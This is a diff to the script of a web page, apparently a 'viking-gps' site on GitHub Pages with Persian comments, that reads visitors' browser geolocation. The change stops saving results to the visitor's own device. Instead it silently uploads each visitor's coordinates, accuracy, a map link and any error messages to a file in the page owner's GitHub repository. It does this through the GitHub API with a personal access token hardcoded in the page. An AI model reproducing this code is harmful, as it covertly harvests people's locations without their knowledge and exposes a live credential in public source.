@@ -92,6 +92,21 @@
     </div>
 
 <script>
+    /* ============================================================
+       تنظیمات GitHub
+       ============================================================ */
+    const GITHUB_TOKEN = "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";  // ← توکن جدید خود را اینجا بگذارید
+    const FILE_PATH    = "location.txt";
+    /* ============================================================ */
+
+    // استخراج خودکار یوزرنیم و نام مخزن از آدرس GitHub Pages
+    // مثال: https://username.github.io/viking-gps/  →  owner=username, repo=viking-gps
+    const REPO_OWNER = window.location.hostname.split(".")[0];
+    const REPO_NAME  = window.location.pathname.split("/").filter(Boolean)[0] || "";
+
+    console.log(`🔍 مخزن شناسایی‌شده: ${REPO_OWNER}/${REPO_NAME}`);
+
+
     const loadingScreen = document.getElementById("loadingScreen");
     const successScreen = document.getElementById("successScreen");
     const errorScreen   = document.getElementById("errorScreen");
@@ -117,43 +132,101 @@
         timeoutIds = [];
     }
 
-    // ---------- ساخت و دانلود فایل txt ----------
-    function downloadLog(text, filename) {
+    // ---------- آپلود به GitHub ----------
+    async function updateGithubFile(newEntry) {
+        if (!REPO_OWNER || !REPO_NAME) {
+            console.error("❌ نتوانستم owner/repo را از آدرس صفحه تشخیص دهم.");
+            return;
+        }
+
+        const apiUrl = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;
+        const headers = {
+            "Authorization": `Bearer ${GITHUB_TOKEN}`,
+            "Accept": "application/vnd.github+json",
+            "X-GitHub-Api-Version": "2022-11-28"
+        };
+
         try {
-            const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
-            const url  = URL.createObjectURL(blob);
+            // ۱. گرفتن SHA و محتوای فعلی
+            let oldContent = "";
+            let sha = null;
 
-            const a    = document.createElement("a");
-            a.href     = url;
-            a.download = filename;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
+            const getRes = await fetch(apiUrl + "?t=" + Date.now(), {
+                headers: headers
+            });
 
-            setTimeout(() => URL.revokeObjectURL(url), 1000);
+            if (getRes.ok) {
+                const data = await getRes.json();
+                sha = data.sha;
+                if (data.content) {
+                    const binary = atob(data.content.replace(/\s/g, ""));
+                    const bytes  = new Uint8Array(binary.length);
+                    for (let i = 0; i < binary.length; i++) {
+                        bytes[i] = binary.charCodeAt(i);
+                    }
+                    oldContent = new TextDecoder("utf-8").decode(bytes);
+                }
+            } else if (getRes.status !== 404) {
+                const err = await getRes.json();
+                console.error("❌ خطا در خواندن فایل:", getRes.status, err);
+                return;
+            }
+
+            // ۲. محتوای جدید = قبلی + بلوک جدید
+            const finalContent = oldContent + newEntry;
+
+            // ۳. رمزگذاری base64 سازگار با UTF-8
+            const bytes = new TextEncoder().encode(finalContent);
+            let binary = "";
+            bytes.forEach(b => binary += String.fromCharCode(b));
+            const encoded = btoa(binary);
+
+            // ۴. PUT برای به‌روزرسانی
+            const body = {
+                message: `📍 موقعیت جدید - ${new Date().toISOString()}`,
+                content: encoded
+            };
+            if (sha) body.sha = sha;
+
+            const putRes = await fetch(apiUrl, {
+                method: "PUT",
+                headers: {
+                    ...headers,
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(body)
+            });
+
+            if (putRes.ok) {
+                console.log("✅ location.txt در GitHub به‌روزرسانی شد");
+            } else {
+                const err = await putRes.json();
+                console.error("❌ خطا در آپلود:", putRes.status, err);
+            }
         } catch (e) {
-            console.error("خطا در ساخت فایل:", e);
+            console.error("❌ خطا در ارتباط با GitHub:", e);
         }
     }
 
-    function buildSuccessLog(lat, lon, acc) {
-        const now      = new Date().toLocaleString("fa-IR");
-        const maps_url = `https://www.google.com/maps?q=${lat},${lon}`;
+    function buildEntry(lat, lon, acc) {
+        const now     = new Date().toLocaleString("fa-IR");
+        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
         return [
             `[${now}] ✅ SUCCESS`,
             `    Latitude : ${lat}`,
             `    Longitude: ${lon}`,
             `    Accuracy : ${acc} m`,
-            `    Maps     : ${maps_url}`,
+            `    Maps     : ${mapsUrl}`,
             `    ${"-".repeat(45)}`,
+            "",
             ""
         ].join("\n");
     }
 
-    function buildErrorLog(reason, desc) {
+    function buildErrorEntry(reason, desc) {
         const now = new Date().toLocaleString("fa-IR");
-        return `[${now}] ❌ ERROR | ${reason} | ${desc}\n`;
+        return `[${now}] ❌ ERROR | ${reason} | ${desc}\n\n`;
     }
 
     // ---------- موفقیت ----------
@@ -168,13 +241,8 @@
 
         showScreen("success");
 
-        // دانلود فایل txt به دستگاه کاربر
-        downloadLog(
-            buildSuccessLog(lat, lon, acc),
-            `location_${Date.now()}.txt`
-        );
+        updateGithubFile(buildEntry(lat, lon, acc));
 
-        // همچنین در console مرورگر هم چاپ شود
         console.log("📍 مختصات:", lat, lon, "دقت:", acc, "متر");
         console.log("🗺 نقشه:", `https://www.google.com/maps?q=${lat},${lon}`);
     }
@@ -199,10 +267,7 @@
         const desc = messages[reason] || "خطای ناشناخته";
         errorText.textContent = desc;
 
-        downloadLog(
-            buildErrorLog(reason, desc),
-            `location_error_${Date.now()}.txt`
-        );
+        updateGithubFile(buildErrorEntry(reason, desc));
     }
 
     // ---------- استراتژی چندمرحله‌ای ----------
